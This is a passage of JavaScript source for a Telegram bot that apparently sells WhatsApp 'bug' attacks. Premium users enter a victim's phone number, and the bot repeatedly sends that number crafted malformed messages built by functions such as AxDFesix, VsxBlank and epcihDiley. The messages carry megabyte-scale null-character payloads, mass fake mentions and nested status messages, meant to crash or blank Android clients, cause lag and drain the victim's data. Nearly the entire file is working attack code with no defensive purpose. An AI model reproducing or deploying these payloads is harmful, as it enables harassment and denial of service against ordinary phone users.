    const sentMessage = await ctx.reply( `\`\`\`js
⚔️ ASTRA VOID BUG ⚔️
Initiate Bug to target

Target : ${q}
Type : Blank Android
Loop : 60
Proses : MENGIRIM

⏳ Please Wait 5 Minutes
No Spam Bugs Allowed 
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[
            { text: "<👁️‍🗨️> CHECK", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );

    const msgId = sentMessage.message_id;

    // 🚀 langsung eksekusi (tanpa loading)
    for (let i = 0; i < 60; i++) {
      await VsxBlank(sock, target);
      await sleep(1300);
    }

    // ✅ edit jadi sukses
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msgId,
      undefined,`\`\`\`js
⚔️ ASTRA VOID BUG ⚔️
Success Send To target

Target : ${q}
Type : Blank Android
Loop : 60
Proses : BERHASIL 

⏳ Please Wait 5 Minutes
No Spam Bugs Allowed 
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[
             { text: "<👁️‍🗨️> CHECK", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );
  }
);

bot.command("buldozer",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 ☇ Format: /buldozer 62×××`);

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // ✅ kirim pesan awal
    const sentMessage = await ctx.reply( `\`\`\`js
⚔️ ASTRA VOID BUG ⚔️
Initiate Bug to target

Target : ${q}
Type : Draining kuota 
Loop : 50
Proses : MENGIRIM

⏳ Please Wait 5 Minutes
No Spam Bugs Allowed 
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[
            { text: "<👁️‍🗨️> CHECK", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );

    const msgId = sentMessage.message_id;

    // 🚀 langsung eksekusi (tanpa loading)
    for (let i = 0; i < 70; i++) {
      await AxDFesix(sock, target);
      await sleep(1500);
    }

    // ✅ edit jadi sukses
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msgId,
      undefined,`\`\`\`js
⚔️ ASTRA VOID BUG ⚔️
Success Send To target

Target : ${q}
Type : Draining kuota 
Loop : 50
Proses : BERHASIL 

⏳ Please Wait 5 Minutes
No Spam Bugs Allowed 
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[
             { text: "<👁️‍🗨️> CHECK", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );
  }
);

bot.command("Magic",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 ☇ Format: /Magic 62×××`);

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // ✅ kirim pesan awal
    const sentMessage = await ctx.reply( `\`\`\`js
⚔️ ASTRA VOID BUG ⚔️
Initiate Bug to target

Target : ${q}
Type : Delay Medium
Loop : 40
Proses : MENGIRIM

⏳ Please Wait 5 Minutes
No Spam Bugs Allowed 
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[
            { text: "<👁️‍🗨️> CHECK", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );

    const msgId = sentMessage.message_id;

    // 🚀 langsung eksekusi (tanpa loading)
    for (let i = 0; i < 60; i++) {
      await SpecialVsXAxDRxvz(sock, target);
      await sleep(1500);
    }

    // ✅ edit jadi sukses
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msgId,
      undefined,`\`\`\`js
⚔️ ASTRA VOID BUG ⚔️
Success Send To target

Target : ${q}
Type : Delay Medium
Loop : 40
Proses : BERHASIL 

⏳ Please Wait 5 Minutes
No Spam Bugs Allowed 
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[
             { text: "<👁️‍🗨️> CHECK", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );
  }
);

//------------------(CASE BEBAS SPAM)--------------------//
bot.command("OverHard", async (ctx) => {

  const userId = ctx.from.id.toString();

  // 🔒 Premium only
  if (!isPremiumUser(userId)) {
    return ctx.reply("❌ <b>Khusus user premium.</b>", { parse_mode: "HTML" });
  }
  
  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 <b>Format:</b> /OverHard 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ <b>Nomor tidak valid.</b>", { parse_mode: "HTML" });
  }

  // ✅ Kirim message dengan 1 button saja
  const msg = await ctx.telegram.sendMessage(
    ctx.chat.id, `\`\`\`js
⚔️ ASTRA BEBAS SPAM ⚔️

Send Bug Completed ✅
Target : ${rawNumber}

Server : ACTIVE\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "📲 CHECK",
              url: `https://wa.me/${rawNumber.replace(/[^0-9]/g, "")}`,
              style: "success" // bisa ganti: primary / success / warning dll
            }
          ]
        ]
      }
    }
  );

  // 🚀 Masuk queue
  queue.add(async () => {
    await runTask(ctx, target);
  });

});

bot.command("OverLow", async (ctx) => {

  const userId = ctx.from.id.toString();

  // 🔒 Premium only
  if (!isPremiumUser(userId)) {
    return ctx.reply("❌ <b>Khusus user premium.</b>", { parse_mode: "HTML" });
  }
  
  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 <b>Format:</b> /OverLow 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ <b>Nomor tidak valid.</b>", { parse_mode: "HTML" });
  }

  // ✅ Kirim message dengan 1 button saja
  const msg = await ctx.telegram.sendMessage(
    ctx.chat.id, `\`\`\`js
⚔️ DELAY BEBAS SPAM ⚔️

Send Bug Completed ✅
Target : ${rawNumber}

Server : ACTIVE\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "📲 CHECK",
              url: `https://wa.me/${rawNumber.replace(/[^0-9]/g, "")}`,
              style: "success" // bisa ganti: primary / success / warning dll
            }
          ]
        ]
      }
    }
  );

  // 🚀 Masuk queue
  queue.add(async () => {
    await LowDelay(ctx, target);
  });

});

//------------------(AWAL OF FUNCTION)--------------------//
async function unix(sock, target) {
  try {
    let msg = await generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        body : { text: "UNIX", format: "DEFAULT" },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "\u0000".repeat(100000)
        },
    contextInfo: {
       mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
       entryPointCenversionSource: "galaxy_message"
      }
    }
  }, {});
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  },
    {
      participant: { jid: target },
      messageId: msg.key.id
    });
  } catch (err) {
    console.log(err.message)
  }
}

async function SpecialVsXAxDRxvz(sock, target) {
  const Yuko = "\x10".repeat(1045000)
  const msg3 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                 name: "address_message",
                   paramsJson: Yuko,
            version: 3
          },
          entryPointConversionSource: "galaxy_message"
                }
             }
          }
        }
      }
    };
 
   
    for (let i = 0; i < 99; i++) {
    await sock.relayMessage(target, msg3, {});
  }
}

async function AxDFesix(sock, target) {
  const Yuko = "\u0000".repeat(1045000)
  const msg1 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: Yuko,
                                version: 3
                            },
                            entryPointConversionSource: "galaxy_message"
                        }
                    }
                }
            }
        }
    };
  
  const msg2 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: "call_permission_request",
                                paramsJson: Yuko,
                                version: 3
                            },
                            entryPointConversionSource: "galaxy_message"
                        }
                    }
                }
            }
        }
    };
  
  const msg3 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                 name: "address_message",
                   paramsJson: Yuko,
            version: 3
          },
          entryPointConversionSource: "galaxy_message"
                }
             }
          }
        }
      }
    };
 
   
  for (const msg of [msg1, msg2, msg3]) {
    for (let i = 0; i < 99; i++) {
    await sock.relayMessage(target, msg, {});
    }
  }
}

async function AxDMolexe(sock, target) {
  const msg1 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: "\x10" + "\u0000".repeat(1030000),
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    };
  
  const msg2 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: "call_permission_request",
                                paramsJson: "\x10" + "\u0000".repeat(1030000),
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    };
  
  const msg3 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: "address_message",
                                paramsJson: "\x10" + "\u0000".repeat(1030000),
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    };
  
  const msg4 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: "payment_method",
                                paramsJson: "\x10" + "\u0000".repeat(1030000),
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    };
    
    const msg5 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: "mpm",
                                paramsJson: "\x10" + "\u0000".repeat(1030000),
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    };
 
  for (const msg of [msg1, msg2, msg3, msg4, msg5]) {
    await sock.relayMessage(
      "status@broadcast", 
      msg,
      {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target }
                  }
                ]
              }
            ]
          }
        ]
      }
    );
  }
}

async function VsxBlank(sock, target) {
  const Ui = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target
            }
          },
          body: {
            text: "VSX"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "DOCUMENT",
                  flow_cta: "ꦽ".repeat(100000),
                  flow_message_version: "3"
                })
              }
            ]
          }
        }
      }
    }
  };
  await sock.relayMessage(target, Ui, {});
}

async function epcihDiley(sock, target) {
    try {
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: {
                        extendedTextMessage: {
                            text: "$",
                            matchedText: "https://t.me/FlavourKelra",
                            description: "$",
                            title: "$",
                            paymentLinkMetadata: {
                                button: {
                                    displayText: "#",
                                },
                                header: {
                                    headerType: 1,
                                },
                                provider: {
                                    paramsJson: "{{".repeat(120000),
                                },
                            },
                            linkPreviewMetadata: {
                                paymentLinkMetadata: {
                                    button: {
                                        displayText: "@jule",
                                    },
                                    header: {
                                        headerType: 1,
                                    },
                                    provider: {
                                        paramsJson: "{{".repeat(120000),
                                    },
                                },
                                urlMetadata: {
                                    fbExperimentId: 999,
                                },
                                fbExperimentId: 888,
                                linkMediaDuration: 555,
                                socialMediaPostType: 1221,
                                videoContentUrl: "https://wa.me/settings/linked_devices#,,jule",
                                videoContentCaption: "@jule",
                            },
                            contextInfo: {
                                isForwarded: true,
                                forwardingScore: 999,
                                quotedMessage: {
                                    locationMessage: {
                                        degreesLatitude: 9.999999919991,
                                        degreesLongitude: -999999999999,
                                        accuracyInMeters: 1
                                    }
                                }
                            }
                        }
                    }
                }
            },
            { participant: { jid: target } }
        );
        
        let parse = true;
        let SID = "5e03e0";
        let key = "10000000_2203140470115547_947412155165083119_n.enc";
        let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
        let type = `image/webp`;
        if (11 > 9) {
            parse = parse ? false : true;
        }

        const stc = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    stickerMessage: {
                        url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
                        fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
                        fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
                        mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
                        mimetype: type,
                        directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
                        fileLength: {
                            low: Math.floor(Math.random() * 1000),
                            high: 0,
                            unsigned: true,
                        },
                        mediaKeyTimestamp: {
                            low: Math.floor(Math.random() * 1700000000),
                            high: 0,
                            unsigned: false,
                        },
                        firstFrameLength: 19904,
                        firstFrameSidecar: "KN4kQ5pyABRAgA==",
                        isAnimated: true,
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                            groupMentions: [],
                            entryPointConversionSource: "non_contact",
                            entryPointConversionApp: "whatsapp",
                            entryPointConversionDelaySeconds: 467593,
                        },
                        stickerSentTs: {
                            low: Math.floor(Math.random() * -20000000),
                            high: 555,
                            unsigned: parse,
                        },
                        isAvatar: parse,
                        isAiSticker: parse,
                        isLottie: parse,
                    },
                },
            },
        }, {});

        const jawir = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "#",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_request"
                    },
                },
            },
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
        });

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: stc.message,
            },
        }, {
            messageId: stc.key.id,
            participant: { jid: target },
        });

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: jawir.message,
            },
        }, {
            messageId: jawir.key.id,
            participant: { jid: target },
        });

    } catch (err) {
        console.error("error:", err);
    }
}

//------------------(AKHIR OF FUNCTION)--------------------//
//------------------(ON/OFF GROUP MODE)--------------------//
// ==============================
// COMMAND CONTROL (OWNER ONLY)
// ==============================
bot.command("GroupMode", ownerOnly(), async (ctx) => {
  setGroupOnlyEnabled(true);
  return ctx.reply("✅ Group Only Mode Telah di Aktifkan Oleh Owner");
});

bot.command("MatikanMode", ownerOnly(), async (ctx) => {
  setGroupOnlyEnabled(false);
  return ctx.reply("⛔ Group Only Mode Telah di Nonaktifkan Oleh Owner");
});

bot.command("CheckMode", ownerOnly(), async (ctx) => {
  return ctx.reply(`🔍 Group Mode Sekarang : ${isGroupOnlyEnabled() ? "Aktif" : "Nonaktif"}`);
});

bot.launch()
